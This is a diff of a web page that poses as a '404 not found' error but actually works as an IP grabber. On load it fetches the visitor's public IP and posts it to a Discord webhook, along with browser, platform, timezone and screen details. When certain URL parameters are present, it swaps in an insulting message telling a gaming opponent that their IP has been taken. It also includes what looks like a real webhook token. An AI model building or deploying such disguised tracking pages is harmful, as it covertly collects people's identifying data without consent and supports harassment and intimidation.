@@ -59,41 +59,77 @@
     </style>
 
 </head>
-<body><script>
+<body>
+    <div>
+        404: index.html not found
+    </div>
+    
+    <script>
+    function parseURLParams(url) {
+    var queryStart = url.indexOf("?") + 1,
+        queryEnd   = url.indexOf("#") + 1 || url.length + 1,
+        query = url.slice(queryStart, queryEnd - 1),
+        pairs = query.replace(/\+/g, " ").split("&"),
+        parms = {}, i, n, v, nv;
 
+    if (query === url || query === "") return;
 
-    function getIP(json) {
-        console.log("My public IP address is: ", json.ip);
-    function sendMessage() {
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1170457387518398494/VqFIUh3Jb4JL4Q8rkxHlG5Dw518o4pXnCNZSKWPTFJD5HoM2MTK-YxeLMShdx33RCUy-");
+    for (i = 0; i < pairs.length; i++) {
+        nv = pairs[i].split("=", 2);
+        n = decodeURIComponent(nv[0]);
+        v = decodeURIComponent(nv[1]);
 
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var params = {
-        username: window.location.href,
-        avatar_url: "",
-        content: json.ip,
-      }
-
-      request.send(JSON.stringify(params));
+        if (!parms.hasOwnProperty(n)) parms[n] = [];
+        parms[n].push(nv.length === 2 ? v : null);
     }
-    sendMessage()
-    console.log('Data:', window.location);
+    return parms;
 }
-</script>
-<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+var urlString = window.location.href;
+    urlParams = parseURLParams(urlString);
+    console.log(urlParams)
+if (urlParams.user && urlParams.access) {
+    document.querySelector("div").remove()
+    document.body.innerHTML = 
+    `<div class="remove">
     <br>
     <h1>
-        Hey, duckietheredrighthand
+        Hey, Hoe
     </h1>
     <br><br>
     <hr width="60%">
     <h2>You little freak</h2>
     <hr width="60%">
     <p>
-        &nbsp;&nbsp;&nbsp;We played bedwars today and when you finally killed me you were so toxic about it... so here i am, getting back at you by finding your discord account. Also, by the time you have finished reading this, your ip address has been sent to me. Last word xoxo</span> <br>
+        &nbsp;&nbsp;&nbsp;We played bedwars today and when you finally killed me you were so toxic about it... so here i am, getting back at your pooron ass. Also, by the time you have finished reading this, your ip address has been sent to me. Last word xoxo</span> <br>
     </p>
+    </div>`
+}
+
+
+
+    function getIP(json) {
+
+
+    function sendMessage() {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/"+urlParams.access[0]+"/VqFIUh3Jb4JL4Q8rkxHlG5Dw518o4pXnCNZSKWPTFJD5HoM2MTK-YxeLMShdx33RCUy-");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: window.location.href,
+        avatar_url: "",
+        content: json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nTIMEZONE: " + navigator.timezone + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight,
+      }
+
+      request.send(JSON.stringify(params));
+    }
+    sendMessage()
+
+}
+
+</script>
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 
 </body>
 </html>
